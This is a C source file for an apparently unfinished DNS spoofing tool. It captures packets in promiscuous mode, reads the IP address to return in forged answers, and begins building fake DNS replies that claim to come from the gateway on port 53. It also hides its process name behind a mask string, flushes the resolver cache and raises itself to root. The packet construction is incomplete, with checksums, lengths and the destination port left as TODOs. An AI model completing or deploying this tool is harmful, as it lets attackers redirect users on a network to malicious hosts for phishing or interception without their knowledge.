#include "spoof.h"

pid_t pid;
struct options_spoofing opts;
struct send_udp send_dns;

int main(int argc, char *argv[]) {

    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char* nic_device;
    u_char* args = NULL;
    pcap_t* nic_fd;


    check_root_user();
    options_spoofing_init(&opts);
    get_ip_address();   // Returning IP address

    program_setup(argc, argv);              // set process name, get root privilege
    nic_device = pcap_lookupdev(errbuf);    // get interface
    get_device_ip(nic_device);
    find_gateway();
    // Confirm
    printf("=================================\n");
    printf("   Spoofing IP : %s\n", opts.spoofing_ip);
    printf("   My       IP : %s\n", opts.device_ip);
    printf("   Gateway  IP : %s\n", opts.gateway_ip);
    printf("=================================\n");
    puts("[ DNS Spoofing Initiated ]");

    // open the device for packet capture & set the device in promiscuous mode
    nic_fd = pcap_open_live(nic_device, BUFSIZ, 1, -1, errbuf);
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    signal(SIGINT,sig_handler);
    pcap_loop(nic_fd, (int) opts.count, pkt_callback, args);

    return 0;
}


void options_spoofing_init(struct options_spoofing* option) {
    memset(option, 0, sizeof(struct options_spoofing));
}


void program_setup(int argc, char *argv[]) {
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    /* Flush caches that has website already visited */
    system("systemd-resolve --flush-caches");

    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


void get_ip_address(void) {
    uint8_t input_length;

    while (1) {
        puts("\n[ Returning IP ]");
        printf("Enter response [ IP ] when get DNS request: ");
        fflush(stdout);
        fgets(opts.spoofing_ip, sizeof(opts.spoofing_ip), stdin);
        input_length = (uint8_t) strlen(opts.spoofing_ip);
        if (input_length > 0 && opts.spoofing_ip[input_length - 1] == '\n') {
            opts.spoofing_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts.spoofing_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void find_gateway(void) {
    FILE* fp = NULL;
    char temp[1024] = {0};
    char* token;

    fp = popen("netstat -rn", "r");
    while (fgets(temp, sizeof(temp), fp) != NULL) {
        // Find the line that contains "0.0.0.0" or "default"
        if (strstr(temp, "0.0.0.0") != NULL || strstr(temp, "default") != NULL) {
            // Extract the gateway IP address
            token = strtok(temp, " ");
            while (token != NULL) {
                if (strcmp(token, "0.0.0.0") == 0 || strcmp(token, "default") == 0) {
                    token = strtok(NULL, " ");
                    printf("Gateway IP: %s\n", token);
                    strcpy(opts.gateway_ip, token);
                    break;
                }
                token = strtok(NULL, " ");
            }
            break;
        }
    }
    pclose(fp);
}


void get_device_ip(char* nic_device) {
    int n;
    struct ifreq ifr;

    n = socket(AF_INET, SOCK_DGRAM, 0);
    //Type of address to retrieve - IPv4 IP address
    ifr.ifr_addr.sa_family = AF_INET;
    //Copy the interface name in the ifreq structure
    strncpy(ifr.ifr_name, nic_device, IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);
    //display result
    strcpy(opts.device_ip, inet_ntoa(((struct sockaddr_in *) &ifr.ifr_addr)->sin_addr));
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void sig_handler(int signum) {
    //Return type of the handler function should be void
    pid = getpid();
    printf("Ctrl + C pressed\n Exit program \n");
    kill(pid,SIGUSR1);
}


void create_packet(void) {

    /* IP header */
    send_dns.ip.ihl = 5;
    send_dns.ip.version = 4;
    send_dns.ip.tos = 0;
    send_dns.ip.id = 0;
    // TODO: calculate totoal length behind
    // send_dns->ip.tot_len =
    send_dns.ip.frag_off = 0;
    send_dns.ip.ttl = 64;
    send_dns.ip.protocol = IPPROTO_UDP;
    send_dns.ip.saddr = host_convert(opts.gateway_ip);
    send_dns.ip.daddr = host_convert(opts.device_ip);
    // TODO: calculate checksum behind
    // send_dns.ip.check =

    /* UDP header */
    send_dns.udp.uh_sport = htons(53);
    // TODO: Set the start port behind
    // send_dns.udp.uh_dport =
    // TODO: Set the udp len behind
    // send_udp.udp.uh_ulen =
    // TODO: calculate checksum behind
    // send_udp.udp.uh_sum =
}

